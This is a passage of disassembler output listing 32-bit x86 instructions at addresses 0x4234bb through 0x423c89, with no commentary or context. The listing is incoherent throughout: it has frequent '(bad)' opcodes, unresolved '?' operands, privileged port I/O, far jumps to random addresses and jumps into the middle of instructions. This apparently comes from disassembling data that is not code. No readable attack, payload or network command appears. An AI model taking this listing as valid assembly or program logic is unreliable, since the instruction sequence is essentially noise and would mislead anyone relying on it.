  4234bb:	ins    BYTE PTR es:[edi],dx
  4234bc:	data16 jne 0x423453
  4234bf:	dec    ecx
  4234c0:	adc    ah,BYTE PTR [ecx+0x10]
  4234c3:	jb     0x423472
  4234c5:	(bad)  
  4234c6:	cmp    al,0x20
  4234c8:	or     ecx,DWORD PTR [ebp+ebp*1+0x1329e349]
  4234cf:	call   eax
  4234d1:	scas   eax,DWORD PTR es:[edi]
  4234d2:	dec    eax
  4234d3:	popa   
  4234d4:	pushf  
  4234d5:	rol    ch,0x31
  4234d8:	xchg   ebx,eax
  4234d9:	pop    ebp
  4234da:	pusha  
  4234db:	loope  0x4234d9
  4234dd:	push   ecx
  4234de:	jmp    0x423540
  4234e0:	xor    BYTE PTR [eax],0x6
  4234e3:	sbb    BYTE PTR [eax+0x5c],bl
  4234e6:	js     0x423501
  4234e8:	push   ss
  4234e9:	test   al,0x80
  4234eb:	mov    WORD PTR [esi],es
  4234ed:	add    dl,BYTE PTR [si+0x75ea]
  4234f2:	xchg   BYTE PTR [esi-0x67],dl
  4234f5:	pop    eax
  4234f6:	adc    BYTE PTR [esi+0x2e],ch
  4234f9:	xor    al,0x68
  4234fb:	out    0x12,eax
  4234fd:	jle    0x423558
  4234ff:	or     bl,al
  423501:	in     al,dx
  423502:	or     DWORD PTR ds:0x810980b0,eax
  423508:	pop    esi
  423509:	popf   
  42350a:	pop    esi
  42350b:	mov    edi,0xc49adc09
  423510:	fld    DWORD PTR [ebx-0x49]
  423513:	test   BYTE PTR [ecx-0x726412c7],cl
  423519:	push   0x57
  42351b:	(bad)  
  42351c:	push   ss
  42351d:	(bad)  
  42351e:	int3   
  42351f:	add    eax,DWORD PTR [eax]
  423521:	iret   
  423522:	xchg   esp,eax
  423523:	xchg   edi,eax
  423524:	sbb    al,0xa7
  423526:	pop    ss
  423527:	push   edx
  423528:	dec    ebx
  423529:	or     BYTE PTR [ebp+0x2a38880f],0x39
  423530:	repnz sub eax,0x9386d745
  423536:	loopne 0x42358c
  423538:	pop    es
  423539:	jns    0x423538
  42353b:	mov    edi,0x2995368e
  423540:	add    al,0xd2
  423542:	sbb    DWORD PTR [edi-0x75],0x14
  423546:	inc    esp
  423547:	or     BYTE PTR [eax],ah
  423549:	inc    eax
  42354a:	aam    0x8
  42354c:	ja     0x4235ad
  42354e:	cmp    ch,BYTE PTR ds:0x533bab3b
  423554:	mov    eax,ds:0x8c1c40a6
  423559:	mov    WORD PTR [edi+0x48f1af1e],?
  42355f:	mov    bh,0x9a
  423561:	into   
  423562:	nop
  423563:	jge    0x423528
  423565:	clc    
  423566:	cmp    eax,0x88c0aeb9
  42356b:	cmp    BYTE PTR [edx+0x68],dh
  42356e:	(bad)  
  42356f:	sub    eax,0x17058d76
  423574:	adc    DWORD PTR [ebp+0xe],ecx
  423577:	in     al,dx
  423578:	(bad)  [eax+ebp*1]
  42357b:	fmulp  st(4),st
  42357d:	jle    0x423531
  42357f:	inc    edx
  423580:	inc    eax
  423581:	iret   
  423582:	jne    0x4235cd
  423584:	cwde   
  423585:	ss mov edi,0xdca068bc
  42358b:	lods   al,BYTE PTR ds:[esi]
  42358c:	jnp    0x4235dd
  42358e:	nop
  42358f:	sbb    ch,BYTE PTR [edx-0x620dd1e]
  423595:	leave  
  423596:	lea    ecx,[esi-0x431de9f4]
  42359c:	sub    DWORD PTR [edx],edx
  42359e:	mov    eax,0x76855674
  4235a3:	inc    ecx
  4235a4:	in     eax,0xa2
  4235a6:	cs jno 0x42357c
  4235a9:	xlat   BYTE PTR ds:[ebx]
  4235aa:	and    BYTE PTR [edx+0x5b8875ce],ah
  4235b0:	mov    ecx,0xd32b71fb
  4235b5:	jne    0x423563
  4235b7:	dec    ecx
  4235b8:	adc    eax,0x42704b87
  4235bd:	add    DWORD PTR [ebx+0x630df319],edx
  4235c3:	push   esi
  4235c4:	aaa    
  4235c5:	aas    
  4235c6:	js     0x423550
  4235c8:	add    eax,eax
  4235ca:	ror    DWORD PTR [esi-0x57],cl
  4235cd:	aam    0x6a
  4235cf:	loop   0x4235fa
  4235d1:	ss mov ebx,0xa74d5807
  4235d7:	push   cs
  4235d8:	mov    dh,0xe
  4235da:	fst    DWORD PTR [edx]
  4235dd:	or     DWORD PTR [esi+ebp*1-0x45],eax
  4235e1:	dec    eax
  4235e2:	mov    esp,edi
  4235e4:	mov    edx,0xcbe8388e
  4235e9:	leave  
  4235ea:	imul   ebp,edi,0x86088a7e
  4235f0:	or     eax,0xa0d49e62
  4235f5:	xor    al,0xe7
  4235f7:	cmc    
  4235f8:	ret    
  4235f9:	dec    edx
  4235fa:	adc    BYTE PTR [edx],dl
  4235fc:	pop    esp
  4235fd:	add    edx,ebx
  4235ff:	sahf   
  423600:	mov    ?,WORD PTR [edx+edi*4]
  423603:	mov    ds:0xb4e06830,eax
  423608:	scas   eax,DWORD PTR es:[edi]
  423609:	sbb    DWORD PTR [eax+eax*8-0x3],0x43
  42360e:	int3   
  42360f:	mov    esp,0xaf16cba4
  423614:	call   0x88b7:0xa2e49f9c
  42361b:	jle    0x423617
  42361d:	test   al,0xec
  42361f:	mov    ecx,0x2276c34e
  423624:	dec    esi
  423625:	pop    eax
  423626:	rcl    BYTE PTR [ebp-0x3ddd362b],cl
  42362c:	popa   
  42362d:	pop    edx
  42362e:	imul   ecx,DWORD PTR [edi+edi*2-0x18604869],0xffffff9c
  423636:	adc    BYTE PTR [ecx-0x8],dl
  423639:	pop    ebp
  42363a:	pop    ecx
  42363b:	jbe    0x4235d9
  42363d:	addr16 repnz dec edi
  423640:	xchg   esi,eax
  423641:	xchg   ebp,eax
  423642:	int3   
  423643:	xchg   esi,eax
  423644:	jp     0x4236b7
  423646:	out    dx,al
  423647:	jecxz  0x423674
  423649:	ret    
  42364a:	push   0x2c9449b9
  42364f:	std    
  423650:	fcmovnb st,st(1)
  423652:	add    eax,0xced43966
  423657:	ja     0x42360b
  423659:	fisttp WORD PTR [eax]
  42365b:	jbe    0x423634
  42365d:	daa    
  42365e:	xchg   ebp,eax
  42365f:	and    al,0x94
  423661:	adc    BYTE PTR [edx+0x4d1157ff],bh
  423667:	jbe    0x4235ee
  423669:	in     eax,dx
  42366a:	inc    edx
  42366b:	mov    dl,0x6a
  42366d:	cmp    DWORD PTR [ecx+0x38],ebp
  423670:	out    dx,al
  423671:	pop    ebp
  423672:	shl    DWORD PTR [esi+0x11],1
  423675:	sbb    eax,0xd0feb741
  42367a:	cld    
  42367b:	je     0x4236a2
  42367d:	jg     0x423684
  42367f:	nop
  423680:	fadd   QWORD PTR [ecx-0x5b]
  423683:	jp     0x42363b
  423685:	pop    ecx
  423686:	fstp   QWORD PTR [esi+0x671ed226]
  42368c:	push   0xffffffbb
  42368e:	jp     0x423614
  423690:	jle    0x423648
  423692:	add    eax,0xf9cb691a
  423697:	dec    ebx
  423698:	shr    DWORD PTR [edx],1
  42369a:	xor    BYTE PTR [eax+0x488f42b0],cl
  4236a0:	sti    
  4236a1:	fs adc al,0x9
  4236a4:	sahf   
  4236a5:	xchg   edi,eax
  4236a6:	retf   
  4236a7:	mov    ch,0x11
  4236a9:	adc    al,0x38
  4236ab:	add    eax,0xc75ad6d6
  4236b0:	xor    DWORD PTR [ecx-0x62],edi
  4236b3:	mov    eax,0xe9cfa159
  4236b8:	lods   al,BYTE PTR ds:[esi]
  4236b9:	js     0x4236b8
  4236bb:	push   es
  4236bc:	or     eax,0xdd13b6c7
  4236c1:	les    esp,FWORD PTR [eax-0x58]
  4236c4:	mov    ecx,0x12e05c92
  4236c9:	dec    ebp
  4236ca:	or     BYTE PTR [eax-0x41],al
  4236cd:	mov    esp,0xa94fcbae
  4236d2:	or     al,0xc8
  4236d4:	retf   0xd3e1
  4236d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236d8:	xchg   esi,eax
  4236d9:	sar    DWORD PTR [edx+0x4c],cl
  4236dc:	aad    0xc9
  4236de:	cmp    BYTE PTR [ebx-0x3b735de],cl
  4236e4:	idiv   DWORD PTR [ecx]
  4236e6:	or     DWORD PTR [edi-0x13fcd1b5],0xffffff92
  4236ed:	fdiv   DWORD PTR [eax+0x6f]
  4236f0:	push   ecx
  4236f1:	sbb    esi,esi
  4236f3:	mov    ss,WORD PTR fs:[esp+ebp*1]
  4236f7:	loopne 0x42374e
  4236f9:	jecxz  0x4236f1
  4236fb:	and    DWORD PTR [eax],eax
  4236fd:	pop    esp
  4236fe:	in     eax,0x81
  423700:	sbb    ebx,ecx
  423702:	scas   eax,DWORD PTR es:[edi]
  423703:	push   cs
  423704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423705:	jb     0x4236ca
  423707:	out    0x99,al
  423709:	push   cs
  42370a:	or     al,0x9c
  42370c:	and    BYTE PTR [esi+0x28ba3753],ah
  423712:	retf   0x3b13
  423715:	jns    0x423764
  423717:	lock imul eax,DWORD PTR [edx+0x444d7bfa],0x8446341
  423722:	imul   ecx,DWORD PTR [ecx],0x3a
  423725:	imul   ebp,DWORD PTR [ebp-0x24],0xa6eeea7e
  42372c:	mov    DWORD PTR [eax],edx
  42372e:	imul   eax,DWORD PTR [edi+0x1a],0x7ec04709
  423735:	mov    eax,0x2263a47
  42373a:	or     edx,edx
  42373c:	aas    
  42373d:	in     al,dx
  42373e:	jle    0x4237a8
  423740:	or     eax,0xb00191c5
  423745:	sbb    eax,0xd6764890
  42374a:	(bad)  
  42374b:	int3   
  42374c:	mov    ds,WORD PTR [edi+0x1a]
  42374f:	cmc    
  423750:	dec    ecx
  423751:	dec    esi
  423752:	fdiv   st(7),st
  423754:	les    edi,FWORD PTR [ebp+0x24]
  423757:	shl    DWORD PTR ss:[ecx-0x485d89a7],cl
  42375e:	icebp  
  42375f:	and    al,0x50
  423761:	mov    dh,0xd
  423763:	push   0xfc2e8a69
  423768:	jle    0x4237c5
  42376a:	in     al,dx
  42376b:	jae    0x423726
  42376d:	mov    dl,0x83
  42376f:	repnz xchg esp,eax
  423771:	mov    bl,0x2c
  423773:	or     DWORD PTR [esi+0x6bb7b4ff],0x2436bd1d
  42377d:	mov    ch,0xb5
  42377f:	sahf   
  423780:	adc    DWORD PTR [edx+edx*2],0x11
  423784:	imul   edx,esp,0xffffffc3
  423787:	xchg   ecx,eax
  423788:	pop    ebx
  423789:	and    ch,bl
  42378b:	jbe    0x423798
  42378d:	mov    edi,0xb1ce6332
  423792:	jnp    0x4237b0
  423794:	cmp    bh,ch
  423796:	loopne 0x423746
  423798:	mov    ebx,0xd72e88af
  42379d:	dec    ebx
  42379e:	jmp    0xe7cbc92
  4237a3:	stc    
  4237a4:	pop    esp
  4237a5:	fstp   TBYTE PTR [eax+0x5f]
  4237a8:	jl     0x4237c1
  4237aa:	mov    dh,0x56
  4237ac:	(bad)  [esi-0x2b]
  4237af:	mov    ebp,0xe4b2b392
  4237b4:	ins    BYTE PTR es:[edi],dx
  4237b5:	sbb    al,0x1e
  4237b7:	iret   
  4237b8:	xor    dh,BYTE PTR [ebx]
  4237ba:	(bad)  
  4237bb:	mov    bl,0x9e
  4237bd:	in     eax,dx
  4237be:	ins    BYTE PTR es:[edi],dx
  4237bf:	ret    0xb69e
  4237c2:	jge    0x42379d
  4237c4:	push   ecx
  4237c5:	xchg   ebp,eax
  4237c6:	es push ds
  4237c8:	pop    ebx
  4237c9:	stc    
  4237ca:	add    eax,0x1e0953fa
  4237cf:	mul    DWORD PTR [eax-0x30d76e2b]
  4237d5:	cmp    al,0x6a
  4237d7:	mov    DWORD PTR [esi+0x3e2c01b8],eax
  4237dd:	or     ebx,DWORD PTR [ecx]
  4237df:	stc    
  4237e0:	cli    
  4237e1:	scas   eax,DWORD PTR es:[edi]
  4237e2:	push   ss
  4237e3:	xchg   ecx,eax
  4237e4:	mov    ebx,0x1cb6b60a
  4237e9:	mov    ebx,0x3c7adc23
  4237ee:	ret    0x56bd
  4237f1:	dec    ebp
  4237f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237f3:	mov    dh,0x9c
  4237f5:	sub    eax,0xf95e5e45
  4237fa:	stc    
  4237fb:	call   0xd32:0xbc0a6c74
  423802:	lock in eax,0xdf
  423805:	mov    bl,0x7f
  423807:	jae    0x4237ec
  423809:	add    eax,0xa05e5b06
  42380e:	les    esi,FWORD PTR [edx+0x479abfeb]
  423814:	call   0x301c43f0
  423819:	pop    edi
  42381a:	lods   al,BYTE PTR ds:[esi]
  42381b:	ficomp WORD PTR [eax+0x5]
  42381e:	jp     0x423890
  423820:	ds hlt 
  423822:	mov    dh,ch
  423824:	lods   eax,DWORD PTR ds:[esi]
  423825:	sub    DWORD PTR [ebx-0x37],esp
  423828:	loop   0x4237c8
  42382a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42382b:	scas   eax,DWORD PTR es:[edi]
  42382c:	loope  0x42387b
  42382e:	jnp    0x4237bd
  423830:	jle    0x4237ec
  423832:	add    eax,0x1c6e051b
  423837:	mov    cl,0x9f
  423839:	xchg   edi,eax
  42383a:	adc    ebx,DWORD PTR [ebp+0x7d]
  42383d:	mov    ebx,0x317815ea
  423842:	sti    
  423843:	mov    cs,ecx
  423845:	int    0xc1
  423847:	xor    ebx,eax
  423849:	ret    0xe6ac
  42384c:	push   ebx
  42384d:	mov    edi,0xae60c6ec
  423852:	mov    ebx,0x6e972d2f
  423857:	mov    ah,0x74
  423859:	sub    BYTE PTR [edi+0x73],0x6f
  42385d:	mov    al,0x73
  42385f:	in     eax,dx
  423860:	ja     0x423819
  423862:	adc    eax,0x9ce51b85
  423867:	fiadd  DWORD PTR [ebx+0x30]
  42386a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42386b:	jge    0x4238db
  42386d:	mov    dl,0x7e
  42386f:	shl    esp,cl
  423871:	mov    dh,0xfd
  423873:	out    0x16,eax
  423875:	aaa    
  423876:	xchg   ecx,eax
  423877:	mov    edi,0xe7d28918
  42387c:	add    eax,0x595250a9
  423881:	mov    BYTE PTR ds:[esi],cl
  423884:	(bad)  
  423885:	js     0x42383f
  423887:	sbb    DWORD PTR [edi],esi
  423889:	repz xchg ecx,eax
  42388b:	(bad)  
  42388c:	push   ebp
  42388d:	mov    dh,0x15
  42388f:	sub    edi,DWORD PTR [edx+ebx*4]
  423892:	stos   DWORD PTR es:[edi],eax
  423893:	clc    
  423894:	sbb    BYTE PTR [edi+0x105a321],0x8e
  42389b:	xchg   esi,eax
  42389c:	pusha  
  42389d:	gs push ds
  42389f:	xor    bl,BYTE PTR [ecx-0x42cfb649]
  4238a5:	adc    eax,DWORD PTR [edi+0x5b]
  4238a8:	gs xor bl,ah
  4238ab:	push   eax
  4238ac:	stos   BYTE PTR es:[edi],al
  4238ad:	mov    bl,0xeb
  4238af:	jnp    0x423891
  4238b1:	mov    BYTE PTR [ebp+0x3bf7c6e9],ah
  4238b7:	icebp  
  4238b8:	test   eax,0xcb7d1dcd
  4238bd:	pop    edi
  4238bf:	add    BYTE PTR [ebp+0x37],cl
  4238c2:	ja     0x42389f
  4238c4:	nop
  4238c5:	pop    ecx
  4238c6:	pop    es
  4238c7:	dec    cx
  4238c9:	sbb    eax,0xa41f3d6f
  4238ce:	push   esi
  4238cf:	clc    
  4238d0:	mov    ebx,0xd635f03f
  4238d5:	int3   
  4238d6:	inc    edi
  4238d7:	psrld  mm5,QWORD PTR [ebp+0x50]
  4238db:	enter  0xbdb3,0x3a
  4238df:	push   0x65d25fcf
  4238e4:	(bad)  
  4238e5:	pushf  
  4238e6:	clc    
  4238e7:	mov    dh,0xe8
  4238e9:	lsl    esp,WORD PTR ds:0xa4b7fb49
  4238f0:	inc    esi
  4238f1:	aam    0xf4
  4238f3:	repnz adc BYTE PTR [edi+0x4a],al
  4238f7:	daa    
  4238f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238f9:	jno    0x42393f
  4238fb:	mov    ecx,0x75e120bb
  423900:	loopne 0x423978
  423902:	test   BYTE PTR [ebx-0x5c],ch
  423905:	push   esi
  423906:	ret    
  423907:	shl    ebx,0xb2
  42390a:	aaa    
  42390b:	push   cs
  42390c:	repz push ebx
  42390e:	dec    DWORD PTR [ebx-0x3d]
  423911:	data16 jecxz 0x4238e1
  423914:	sbb    eax,0x5ce34802
  423919:	jmp    0x423920
  42391b:	push   ss
  42391c:	(bad)
  42391f:	fdiv   DWORD PTR [ecx+0x37]
  423922:	(bad)
  423925:	lahf   
  423926:	repz repnz fst DWORD PTR [edi]
  42392a:	and    DWORD PTR [ebp+edi*2-0x2e],0xffffff9f
  42392f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423930:	fmul   QWORD PTR [ecx]
  423932:	scas   al,BYTE PTR es:[edi]
  423933:	(bad)  
  423934:	sbb    eax,0x5a405a09
  423939:	enter  0x2d6f,0x2
  42393d:	inc    edx
  42393e:	imul   edi,DWORD PTR [edi*1-0xbc1b8a0],0x14de58de
  423949:	mov    ds:0xed898cc0,al
  42394e:	aas    
  42394f:	push   esp
  423950:	jo     0x423944
  423952:	out    0x38,al
  423954:	lods   al,BYTE PTR ds:[esi]
  423955:	xor    al,dl
  423957:	psraw  mm7,QWORD PTR [esi+0x283723fc]
  42395e:	rcl    ah,0x7e
  423961:	fisub  WORD PTR [esi-0x1acf6814]
  423967:	test   DWORD PTR ds:0x2e05b1ee,esp
  42396d:	pop    esi
  42396e:	fwait
  42396f:	out    0x19,al
  423971:	mov    ds,WORD PTR [edx-0x60]
  423974:	loop   0x423976
  423976:	sbb    ebx,DWORD PTR [edi+0x1f]
  423979:	std    
  42397a:	clc    
  42397b:	push   ecx
  42397c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397d:	jb     0x42390f
  42397f:	mov    ebp,0xd2408c61
  423984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423985:	cld    
  423986:	add    eax,0x46819af2
  42398b:	push   cs
  42398c:	xchg   DWORD PTR ds:0xe9a6526f,edi
  423992:	in     al,0xaf
  423994:	pop    es
  423995:	lahf   
  423996:	xor    BYTE PTR [ebp+0x7a],cl
  423999:	imul   esp,DWORD PTR [ecx],0x51
  42399c:	cmp    eax,0x199b4352
  4239a1:	retf   0x679d
  4239a4:	fidivr WORD PTR [ebx+0x101c60dc]
  4239aa:	mov    WORD PTR [eax+0x271223c6],?
  4239b0:	jmp    0x42394e
  4239b2:	dec    esp
  4239b3:	mov    al,ds:0x31c47a17
  4239b8:	out    dx,al
  4239b9:	push   ss
  4239ba:	mov    cl,0x73
  4239bc:	push   edx
  4239bd:	push   cs
  4239be:	scas   al,BYTE PTR es:[edi]
  4239bf:	inc    ebx
  4239c0:	pop    edx
  4239c1:	retf   
  4239c2:	inc    edx
  4239c3:	xor    eax,0x97859f96
  4239c8:	and    DWORD PTR [esi+0x14adebc],edx
  4239ce:	push   eax
  4239cf:	add    DWORD PTR [edi],ebx
  4239d1:	test   DWORD PTR [ecx-0x7095e016],ebx
  4239d7:	and    ebx,DWORD PTR [esi]
  4239d9:	sub    cl,ch
  4239db:	dec    ecx
  4239dc:	lock pop es
  4239de:	mov    DWORD PTR [edx],eax
  4239e0:	jbe    0x4239c4
  4239e2:	push   ecx
  4239e3:	or     al,0xfb
  4239e5:	jnp    0x423a63
  4239e7:	ins    DWORD PTR es:[edi],dx
  4239e8:	jmp    0xdcef:0xc02dde6a
  4239ef:	mov    ebx,DWORD PTR [ebp-0x2d971e8]
  4239f5:	test   eax,0x44800ca5
  4239fa:	inc    eax
  4239fb:	mov    BYTE PTR [ebx+0x755f65e3],al
  423a01:	jmp    0x423a37
  423a03:	pop    ss
  423a04:	mov    cl,0xb4
  423a06:	xor    eax,0x69bb866e
  423a0b:	dec    esp
  423a0c:	fidiv  WORD PTR [esi-0xe]
  423a0f:	add    dl,BYTE PTR [edi+eax*8]
  423a12:	dec    edi
  423a13:	and    al,0xc6
  423a15:	pusha  
  423a16:	sub    al,0x6
  423a18:	adc    eax,0xe5ebba1e
  423a1d:	jmp    0x9891db48
  423a22:	loop   0x423a32
  423a24:	or     DWORD PTR [eax-0x5830a7c2],esi
  423a2a:	xchg   ecx,eax
  423a2b:	int3   
  423a2c:	cld    
  423a2d:	mov    WORD PTR [esi+ebp*8-0x7d],ds
  423a31:	in     eax,0x52
  423a33:	sub    al,0xff
  423a35:	imul   edx,DWORD PTR [eax-0x42],0xffffffc9
  423a39:	ds out dx,al
  423a3b:	jecxz  0x4239be
  423a3d:	push   cs
  423a3e:	dec    edi
  423a3f:	icebp  
  423a40:	scas   eax,DWORD PTR es:[edi]
  423a41:	jl     0x4239ff
  423a43:	int    0xf0
  423a45:	mov    ch,ah
  423a47:	popa   
  423a48:	and    DWORD PTR [esi-0x79],edx
  423a4b:	xlat   BYTE PTR ds:[ebx]
  423a4c:	mul    DWORD PTR [esp+ebx*2+0x16]
  423a50:	jmp    0xd9ed:0xf24b602e
  423a57:	call   0xe131:0x92bec05f
  423a5e:	add    al,BYTE PTR [edi-0x29]
  423a61:	out    dx,eax
  423a62:	loope  0x423a11
  423a64:	cld    
  423a65:	ficom  WORD PTR [edx-0x53a57225]
  423a6b:	dec    esp
  423a6c:	pop    ecx
  423a6d:	mov    WORD PTR [esi+0x41],es
  423a70:	leave  
  423a71:	(bad)  
  423a72:	fldcw  WORD PTR [eax+ebx*8-0x3]
  423a76:	inc    edx
  423a77:	aam    0xca
  423a79:	xchg   edx,eax
  423a7a:	aaa    
  423a7b:	ret    0x27bc
  423a7e:	pop    es
  423a7f:	in     eax,dx
  423a80:	jbe    0x423a5d
  423a82:	jb     0x423af9
  423a84:	lds    edi,FWORD PTR [eax+0x11]
  423a87:	icebp  
  423a88:	fbstp  TBYTE PTR [esi]
  423a8a:	jmp    FWORD PTR [edx]
  423a8c:	xor    BYTE PTR [ecx-0x8],ch
  423a8f:	jg     0x423acb
  423a91:	cmp    ah,BYTE PTR [esi-0x27]
  423a94:	push   cs
  423a95:	xchg   dh,ch
  423a97:	dec    esi
  423a98:	ins    BYTE PTR es:[edi],dx
  423a99:	in     al,0x8c
  423a9b:	fwait
  423a9c:	xchg   ebx,eax
  423a9d:	xchg   esi,eax
  423a9e:	add    al,0xad
  423aa0:	out    dx,eax
  423aa1:	es mov dh,0x49
  423aa4:	mov    dl,0x67
  423aa6:	pop    eax
  423aa7:	ficomp DWORD PTR [ebx+0x4f]
  423aaa:	sub    DWORD PTR [ecx-0x64],ebp
  423aad:	lea    esi,[ecx]
  423aaf:	test   edx,eax
  423ab1:	mov    ds:0x2c350791,al
  423ab6:	and    esp,DWORD PTR [edi]
  423ab8:	jmp    0xf9bc:0xc3d633c
  423abf:	xor    DWORD PTR [ecx+0x48],esp
  423ac2:	dec    ebp
  423ac3:	into   
  423ac4:	shl    BYTE PTR [ecx-0xb],0xd6
  423ac8:	jecxz  0x423ad1
  423aca:	push   esp
  423acb:	adc    al,0x6b
  423acd:	jmp    0xbdb2e708
  423ad2:	sbb    eax,0x9acca69a
  423ad7:	ror    BYTE PTR [edi],cl
  423ad9:	je     0x423ac2
  423adb:	dec    esp
  423adc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423add:	inc    esi
  423ade:	sub    esp,DWORD PTR [eax]
  423ae0:	cmp    ebp,DWORD PTR [ecx+edx*2+0x4a7eecf]
  423ae7:	icebp  
  423ae8:	dec    edi
  423ae9:	mov    esp,0xa66b5b7d
  423aee:	or     eax,0x4ac3b865
  423af3:	js     0x423ab1
  423af5:	and    BYTE PTR [edi],ah
  423af7:	mov    al,0xcb
  423af9:	xor    al,0x9d
  423afb:	lods   eax,DWORD PTR ds:[esi]
  423afc:	pop    ds
  423afd:	push   ecx
  423afe:	jne    0x423b28
  423b00:	inc    esi
  423b01:	pop    ecx
  423b02:	in     eax,0xdf
  423b04:	pop    esi
  423b05:	addr16 push eax
  423b07:	dec    ebp
  423b08:	scas   al,BYTE PTR es:[edi]
  423b09:	inc    ebx
  423b0a:	mov    BYTE PTR [edx],bh
  423b0c:	div    eax
  423b0e:	test   BYTE PTR [eax],0xbb
  423b11:	sub    eax,0xa1e5d85a
  423b16:	cli    
  423b17:	inc    ebx
  423b18:	sar    ch,0xf2
  423b1b:	mov    eax,0x6c313c5f
  423b20:	pusha  
  423b21:	jo     0x423aa3
  423b23:	cmp    DWORD PTR [ecx],esi
  423b25:	cmp    BYTE PTR [esi],bh
  423b27:	popf   
  423b28:	xchg   ebx,eax
  423b29:	ror    eax,0x48
  423b2c:	jg     0x423ace
  423b2e:	push   edx
  423b2f:	icebp  
  423b30:	jne    0x423b36
  423b32:	call   DWORD PTR [ebx]
  423b34:	sahf   
  423b35:	fisub  WORD PTR [edx-0x9]
  423b38:	(bad)  
  423b39:	dec    esp
  423b3a:	rol    BYTE PTR [edx-0x7e],cl
  423b3d:	neg    DWORD PTR [ebp+eiz*4+0x6]
  423b41:	inc    ebx
  423b42:	pop    ebp
  423b43:	cs (bad) 
  423b45:	aaa    
  423b46:	xchg   edx,esi
  423b48:	not    DWORD PTR [edi]
  423b4a:	stc    
  423b4b:	popf   
  423b4c:	xchg   BYTE PTR [edi-0x7a],ch
  423b4f:	pop    esi
  423b50:	test   WORD PTR [edi-0x3dec8c50],0xf021
  423b59:	xor    dl,BYTE PTR [ebp-0x46]
  423b5c:	push   esi
  423b5d:	jp     0x423bcc
  423b5f:	(bad)  
  423b60:	aas    
  423b61:	addr16 loopne 0x423b5e
  423b64:	dec    ebp
  423b65:	sbb    ah,BYTE PTR [ebp-0x4e]
  423b68:	or     eax,0x7a56a321
  423b6d:	sub    eax,0x5d983405
  423b72:	cmc    
  423b73:	jmp    0x8bda4346
  423b78:	adc    eax,ebx
  423b7a:	scas   al,BYTE PTR es:[edi]
  423b7b:	scas   eax,DWORD PTR es:[edi]
  423b7c:	mov    ebx,0xdf6533f2
  423b81:	sub    DWORD PTR [ecx+0x32],esp
  423b84:	jne    0x423bde
  423b86:	mov    eax,0xe473167a
  423b8b:	add    ch,bl
  423b8d:	mov    bl,dl
  423b8f:	hlt    
  423b90:	retf   0xb7c6
  423b93:	retf   
  423b94:	xchg   edi,eax
  423b95:	pop    esi
  423b96:	dec    edx
  423b97:	pop    ss
  423b98:	(bad)  
  423b99:	jns    0x423b6d
  423b9b:	lahf   
  423b9c:	xchg   edx,eax
  423b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b9e:	aad    0x72
  423ba0:	test   al,ah
  423ba2:	mov    ebp,0xd5d378c7
  423ba7:	sti    
  423ba8:	push   esp
  423ba9:	jge    0x423b84
  423bab:	mov    ch,0xe1
  423bad:	and    eax,0x362fa7ca
  423bb2:	lods   eax,DWORD PTR ds:[esi]
  423bb3:	inc    esi
  423bb4:	aaa    
  423bb5:	xchg   edi,eax
  423bb6:	adc    dl,BYTE PTR [ebp+ebx*1-0x3c8cdea6]
  423bbd:	xchg   esi,eax
  423bbe:	push   ds
  423bbf:	cmp    bh,BYTE PTR [edi+ebp*1+0x2e]
  423bc3:	pop    esi
  423bc4:	xchg   esp,eax
  423bc5:	jmp    0xa45ec990
  423bca:	jb     0x423b8f
  423bcc:	(bad)  
  423bcd:	sti    
  423bce:	add    eax,DWORD PTR [eax+0x12]
  423bd1:	pop    eax
  423bd2:	mov    ?,WORD PTR [ebx-0x6ca5a1d2]
  423bd8:	sub    eax,0xf6d32b5e
  423bdd:	adc    DWORD PTR [ebx+ebx*1],ecx
  423be0:	push   0xffffffa9
  423be2:	mov    ch,0xd
  423be4:	dec    eax
  423be5:	out    0xdc,eax
  423be7:	ret    0xade7
  423bea:	sbb    DWORD PTR [esi+0x222eb818],edi
  423bf0:	inc    esp
  423bf1:	push   ebx
  423bf2:	les    esp,FWORD PTR [esi-0x6a450b26]
  423bf8:	in     eax,dx
  423bf9:	fbstp  TBYTE PTR [esi+0xe]
  423bfc:	dec    eax
  423bfd:	mov    cl,0x19
  423bff:	xor    ebx,0xaded38b6
  423c05:	popf   
  423c06:	pushf  
  423c07:	xor    bh,BYTE PTR [ebp-0x13]
  423c0a:	cmp    BYTE PTR [edx-0x3f],ch
  423c0d:	aam    0x67
  423c0f:	mov    esi,DWORD PTR [esi]
  423c11:	mov    edi,0x4c2a2a89
  423c16:	call   0x8f873275
  423c1b:	test   al,0xcc
  423c1d:	scas   eax,DWORD PTR es:[edi]
  423c1e:	call   0x9381:0x8e32faec
  423c25:	mov    esp,0xc9bb3a87
  423c2a:	pop    esp
  423c2b:	cwde   
  423c2c:	mov    ecx,?
  423c2e:	push   ebp
  423c2f:	xchg   DWORD PTR [eax+0x7642748c],edi
  423c35:	xor    BYTE PTR [ebx-0x717001ab],ch
  423c3b:	sar    BYTE PTR [esi-0x6ab349e4],0x9e
  423c42:	test   al,0x87
  423c44:	and    DWORD PTR [eax-0x776a0654],esp
  423c4a:	and    ebx,eax
  423c4c:	and    ah,bl
  423c4e:	jp     0x423cb0
  423c50:	cmp    DWORD PTR [ebx+0x2ddb54fa],esi
  423c56:	xor    eax,0x6ef13caf
  423c5b:	aam    0x3d
  423c5d:	pop    ecx
  423c5e:	loopne 0x423c1b
  423c60:	outs   dx,DWORD PTR ds:[esi]
  423c61:	jg     0x423c80
  423c63:	jo     0x423ce4
  423c65:	sub    eax,edx
  423c67:	cmp    ebx,DWORD PTR [ebx]
  423c69:	in     al,0xaa
  423c6b:	jmp    FWORD PTR [ebp+0x1]
  423c6e:	in     al,0x94
  423c70:	sbb    eax,0x3ddc83d8
  423c75:	loope  0x423c1a
  423c77:	call   0x3485:0x49c07f65
  423c7e:	mov    ?,WORD PTR [eax]
  423c80:	add    ch,BYTE PTR [edx-0x6fb1a96]
  423c86:	and    BYTE PTR [ebx-0x24],ah
  423c89:	or     al,0xf6
